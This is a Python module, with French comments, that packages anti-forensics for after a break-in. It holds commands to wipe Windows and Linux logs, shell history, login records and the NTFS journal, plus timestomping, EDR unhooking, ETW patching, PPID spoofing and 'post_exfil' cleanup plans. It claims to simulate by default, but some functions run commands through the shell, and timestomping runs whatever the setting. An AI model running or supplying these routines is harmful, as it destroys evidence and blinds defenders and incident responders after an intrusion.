"""
Anti-Forensics — Bloc 7 Automation Stratégique
Effacement de logs, timestomping, suppression d'artefacts, évasion mémoire,
nettoyage de traces post-exploitation.
Simulation par défaut — commandes réelles générées mais NON exécutées.
"""
from __future__ import annotations

import logging
import os
import random
import subprocess
import uuid
from datetime import datetime
from pathlib import Path
from typing import Dict, List, Optional

logger = logging.getLogger(__name__)

_SESSIONS: Dict[str, Dict] = {}
_OUTPUT = Path("./data/automation/antiforensics")
_OUTPUT.mkdir(parents=True, exist_ok=True)

_LOG_TARGETS_WINDOWS = {
    "system_eventlog": {
        "path": "System.evtx",
        "cmd_clear": "wevtutil cl System",
        "cmd_query": "wevtutil qe System /c:5 /f:text",
        "risk": "HIGH",
        "artifacts": ["Microsoft-Windows-EventLog"],
    },
    "security_eventlog": {
        "path": "Security.evtx",
        "cmd_clear": "wevtutil cl Security",
        "risk": "CRITICAL",
        "artifacts": ["Logon events 4624/4625/4648/4672"],
    },
    "application_eventlog": {
        "path": "Application.evtx",
        "cmd_clear": "wevtutil cl Application",
        "risk": "MEDIUM",
    },
    "powershell_log": {
        "path": r"Microsoft\Windows\PowerShell\Operational.evtx",
        "cmd_clear": "wevtutil cl Microsoft-Windows-PowerShell/Operational",
        "risk": "HIGH",
        "artifacts": ["ScriptBlock logs", "Module logging", "PSReadline history"],
    },
    "prefetch": {
        "path": r"C:\Windows\Prefetch\*.pf",
        "cmd_clear": r"del /Q C:\Windows\Prefetch\*.pf",
        "risk": "HIGH",
        "artifacts": ["Execution evidence", "File access patterns"],
    },
    "shimcache": {
        "path": r"HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\AppCompatCache",
        "cmd_clear": "reg delete HKLM\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\AppCompatCache /v AppCompatCache /f",
        "risk": "HIGH",
    },
    "amcache": {
        "path": r"C:\Windows\AppCompat\Programs\Amcache.hve",
        "cmd_clear": "Remove-Item -Force $env:SystemRoot\\AppCompat\\Programs\\Amcache.hve",
        "risk": "MEDIUM",
    },
    "lnk_recent": {
        "path": r"%APPDATA%\Microsoft\Windows\Recent\*.lnk",
        "cmd_clear": r"del /Q %APPDATA%\Microsoft\Windows\Recent\*.lnk",
        "risk": "MEDIUM",
        "artifacts": ["Recently accessed files"],
    },
    "mft_journal": {
        "path": r"C:\$MFT",
        "cmd_clear": "fsutil usn deletejournal /D C:",
        "risk": "HIGH",
        "artifacts": ["NTFS USN Journal — file operations history"],
    },
    "recycle_bin": {
        "path": r"C:\$Recycle.Bin",
        "cmd_clear": r"rd /s /q C:\$Recycle.Bin",
        "risk": "LOW",
    },
}

_LOG_TARGETS_LINUX = {
    "auth_log": {
        "path": "/var/log/auth.log",
        "cmd_clear": "> /var/log/auth.log",
        "cmd_realtime": "tail -f /var/log/auth.log",
        "risk": "CRITICAL",
        "artifacts": ["SSH logins", "sudo usage", "PAM events"],
    },
    "syslog": {
        "path": "/var/log/syslog",
        "cmd_clear": "> /var/log/syslog",
        "risk": "HIGH",
    },
    "bash_history": {
        "path": "~/.bash_history",
        "cmd_clear": "history -c && history -w && unset HISTFILE && export HISTSIZE=0",
        "risk": "HIGH",
        "artifacts": ["Command history"],
    },
    "wtmp_utmp": {
        "path": "/var/log/wtmp, /var/run/utmp",
        "cmd_clear": "> /var/log/wtmp && > /var/run/utmp",
        "risk": "HIGH",
        "artifacts": ["Login records (last, who, w)"],
    },
    "lastlog": {
        "path": "/var/log/lastlog",
        "cmd_clear": "> /var/log/lastlog",
        "risk": "MEDIUM",
    },
    "cron_log": {
        "path": "/var/log/cron",
        "cmd_clear": "> /var/log/cron",
        "risk": "MEDIUM",
        "artifacts": ["Scheduled task execution"],
    },
    "journal": {
        "path": "/var/log/journal",
        "cmd_clear": "journalctl --vacuum-time=1s",
        "risk": "CRITICAL",
        "artifacts": ["systemd journal — complete system events"],
    },
    "ssh_known_hosts": {
        "path": "~/.ssh/known_hosts",
        "cmd_clear": "> ~/.ssh/known_hosts",
        "risk": "LOW",
    },
    "tmp_files": {
        "path": "/tmp, /var/tmp",
        "cmd_clear": "find /tmp /var/tmp -type f -exec shred -u {} \\;",
        "risk": "MEDIUM",
        "artifacts": ["Dropped tools", "Temporary payloads"],
    },
}

_TIMESTOMP_TECHNIQUES = {
    "mace_clone": {
        "name": "MACE Clone (copie timestamps d'un fichier légitime)",
        "tool_windows": "timestomp.exe target.exe -f C:\\Windows\\system32\\notepad.exe",
        "tool_linux": "touch -r /bin/ls target_file",
        "impact": "Modifie M/A/C/E timestamps",
        "forensic_bypass": "Évite la détection basée sur les timestamps récents",
    },
    "epoch_zero": {
        "name": "Epoch Zero (timestamps à 1970-01-01)",
        "tool_windows": "timestomp.exe target.exe -z",
        "tool_linux": "touch -t 197001010000 target_file",
        "impact": "Timestamps clairement manipulés mais efface la chronologie",
    },
    "custom_date": {
        "name": "Date personnalisée (se fondre dans l'environnement)",
        "tool_windows": "timestomp.exe target.exe -m '01/15/2023 09:32:14'",
        "tool_linux": "touch -t 202301150932.14 target_file",
        "impact": "Timestamps cohérents avec le contexte — difficile à détecter",
    },
    "ntfs_extended": {
        "name": "NTFS Extended Attributes Manipulation",
        "tool_windows": "SetMACE (manipule $STANDARD_INFO ET $FILE_NAME)",
        "note": "Certains outils ne modifient que $STANDARD_INFO — $FILE_NAME reste intact",
        "forensic_bypass": "SetMACE modifie les deux attributs pour cohérence totale",
    },
}

_MEMORY_EVASION = {
    "heap_spray_cleanup": {
        "desc": "Nettoyage des artefacts de heap spray après exploitation",
        "technique": "Réécriture des zones mémoire utilisées puis libération propre",
    },
    "process_hollowing_cleanup": {
        "desc": "Réstauration des headers PE originaux après process hollowing",
        "technique": "Restaurer l'EntryPoint et IMAGE_OPTIONAL_HEADER du processus hôte",
    },
    "dll_unhooking": {
        "desc": "Suppression des hooks EDR en mémoire",
        "technique": "Reload fresh ntdll.dll depuis disque pour bypasser les hooks en mémoire",
        "tools": ["syscall direct", "SysWhispers3", "Hell's Gate / Halo's Gate"],
    },
    "ppid_spoofing": {
        "desc": "Falsification du PPID pour masquer la chaîne de processus",
        "technique": "CreateProcess avec PROC_THREAD_ATTRIBUTE_PARENT_PROCESS",
    },
    "event_log_bypass": {
        "desc": "Désactivation de l'agent EventLog sans tuer le service",
        "technique": "Patch de EtwEventWrite en mémoire / Thread suspension de l'EventLog service",
    },
    "beacon_sleep_obfuscation": {
        "desc": "Chiffrement du beacon en mémoire pendant les périodes de sleep",
        "tools": ["Ekko", "Cronos", "Foliage"],
        "technique": "APC-based sleep + ROP chain pour XOR/RC4 du shellcode en mémoire",
    },
}

_SECURE_DELETE_METHODS = {
    "shred_dod": {
        "name": "DoD 5220.22-M (7 passes)",
        "cmd_linux": "shred -vzn 7 {file}",
        "cmd_windows": "SDelete -p 7 {file}",
        "standard": "DoD 5220.22-M",
    },
    "gutmann": {
        "name": "Gutmann (35 passes)",
        "cmd_linux": "shred -vzn 35 {file}",
        "standard": "Gutmann 1996",
        "note": "Nécessaire uniquement pour disques magnétiques — inutile sur SSD",
    },
    "random_overwrite": {
        "name": "Aléatoire simple (SSD-compatible)",
        "cmd_linux": "dd if=/dev/urandom of={file} bs=4K && rm {file}",
        "cmd_windows": "cipher /w:{dir}",
        "note": "Pour SSD — plusieurs passes inutiles à cause du wear leveling",
    },
    "crypto_erase": {
        "name": "Crypto-Erase (FDE key rotation)",
        "desc": "Chiffrement du volume puis destruction de la clé — données irrécupérables",
        "cmd_linux": "cryptsetup luksErase /dev/sdX",
    },
}


class AntiForensicsService:

    def list_log_targets(self, os_type: str = "linux") -> Dict:
        targets = _LOG_TARGETS_LINUX if os_type == "linux" else _LOG_TARGETS_WINDOWS
        return {
            "os": os_type,
            "targets": {k: {"path": v["path"], "risk": v.get("risk","MEDIUM"),
                            "artifacts": v.get("artifacts", [])}
                        for k, v in targets.items()}
        }

    def list_timestomp_techniques(self) -> Dict:
        return _TIMESTOMP_TECHNIQUES

    def list_memory_evasion(self) -> Dict:
        return _MEMORY_EVASION

    def list_secure_delete(self) -> Dict:
        return _SECURE_DELETE_METHODS

    def clear_logs(self, os_type: str, targets: List[str], dry_run: bool = True) -> Dict:
        log_db  = _LOG_TARGETS_LINUX if os_type == "linux" else _LOG_TARGETS_WINDOWS
        results = []
        for t in targets:
            entry = log_db.get(t)
            if not entry:
                results.append({"target": t, "status": "unknown"})
                continue
            cmd = entry.get("cmd_clear", "N/A")
            if dry_run:
                status = "simulated"
            else:
                # Tenter l'exécution réelle si le fichier existe et on est root
                path = entry.get("path","")
                if os_type == "linux" and os.path.exists(path) and os.getuid() == 0:
                    try:
                        subprocess.run(cmd, shell=True, timeout=10, capture_output=True)
                        status = "executed"
                    except Exception as e:
                        status = f"failed: {e}"
                else:
                    status = "simulated"
            results.append({
                "target":  t,
                "path":    entry.get("path"),
                "command": cmd,
                "risk":    entry.get("risk","MEDIUM"),
                "status":  status,
            })
        return {
            "os":       os_type,
            "dry_run":  dry_run,
            "results":  results,
            "cleared":  len([r for r in results if r["status"] in ["executed","simulated"]]),
            "simulated": True,
        }

    def timestomp_file(
        self,
        target_path: str,
        technique: str = "mace_clone",
        reference_file: Optional[str] = None,
        custom_date: Optional[str] = None,
    ) -> Dict:
        tech = _TIMESTOMP_TECHNIQUES.get(technique, _TIMESTOMP_TECHNIQUES["mace_clone"])
        ref  = reference_file or "/bin/ls"
        cmd  = tech.get("tool_linux", "N/A").replace("target_file", target_path).replace("/bin/ls", ref)

        # Tentative réelle si fichier existe
        executed = False
        if os.path.exists(target_path) and os.path.exists(ref):
            try:
                subprocess.run(f"touch -r {ref} {target_path}", shell=True, timeout=5, capture_output=True)
                executed = True
            except Exception:
                pass

        return {
            "target_path":  target_path,
            "technique":    technique,
            "technique_name": tech["name"],
            "command":      cmd,
            "reference_file": ref,
            "executed":     executed,
            "simulated":    not executed,
            "forensic_bypass": tech.get("forensic_bypass", "Timestamps modifiés"),
        }

    def memory_evasion_plan(self, techniques: List[str]) -> Dict:
        plan = []
        for t in techniques:
            entry = _MEMORY_EVASION.get(t)
            if entry:
                plan.append({"technique": t, **entry})
        return {
            "techniques_count": len(plan),
            "plan":             plan,
            "implementation_order": [
                "1. dll_unhooking — avant toute exécution en mémoire",
                "2. ppid_spoofing — lors du spawn du processus",
                "3. beacon_sleep_obfuscation — en boucle pendant le sleep",
                "4. event_log_bypass — après initial access",
                "5. process_hollowing_cleanup — après utilisation",
            ],
            "simulated": True,
        }

    def secure_delete_plan(
        self,
        files: List[str],
        method: str = "random_overwrite",
        include_slack: bool = True,
    ) -> Dict:
        m = _SECURE_DELETE_METHODS.get(method, _SECURE_DELETE_METHODS["random_overwrite"])
        cmds = [m.get("cmd_linux","N/A").format(file=f) for f in files]
        return {
            "method":       method,
            "method_name":  m["name"],
            "files":        files,
            "commands":     cmds,
            "note":         m.get("note",""),
            "include_slack": include_slack,
            "slack_note":   "Les données peuvent subsister dans le file slack (espace entre fin de fichier et fin de cluster)",
            "simulated":    True,
        }

    def full_cleanup_plan(self, os_type: str = "linux", scenario: str = "post_exfil") -> Dict:
        scenarios = {
            "post_exfil": {
                "priority_logs": ["bash_history","auth_log","wtmp_utmp","journal"],
                "memory_ops":    ["beacon_sleep_obfuscation","event_log_bypass"],
                "timestomp":     ["mace_clone"],
                "files_to_delete": ["/tmp/stager","~/.ssh/id_rsa_tmp","~/tools/"],
            },
            "post_lateral": {
                "priority_logs": ["auth_log","syslog","cron_log"],
                "memory_ops":    ["ppid_spoofing","dll_unhooking"],
                "timestomp":     ["custom_date"],
                "files_to_delete": ["/tmp/pivot_tool","/var/tmp/beacon"],
            },
            "full_wipe": {
                "priority_logs": list(_LOG_TARGETS_LINUX.keys() if os_type == "linux" else _LOG_TARGETS_WINDOWS.keys()),
                "memory_ops":    list(_MEMORY_EVASION.keys()),
                "timestomp":     list(_TIMESTOMP_TECHNIQUES.keys()),
                "files_to_delete": ["ALL_DROPPED_TOOLS"],
            },
        }
        sc = scenarios.get(scenario, scenarios["post_exfil"])
        return {
            "os":      os_type,
            "scenario": scenario,
            "steps": [
                {"order": 1, "action": "log_clearing",      "targets": sc["priority_logs"]},
                {"order": 2, "action": "memory_evasion",    "techniques": sc["memory_ops"]},
                {"order": 3, "action": "timestomping",      "techniques": sc["timestomp"]},
                {"order": 4, "action": "secure_delete",     "targets": sc["files_to_delete"]},
                {"order": 5, "action": "self_destruct_dropper", "note": "Supprimer le dropper initial (se supprimer lui-même)"},
            ],
            "estimated_time_seconds": random.randint(30, 180),
            "simulated": True,
        }
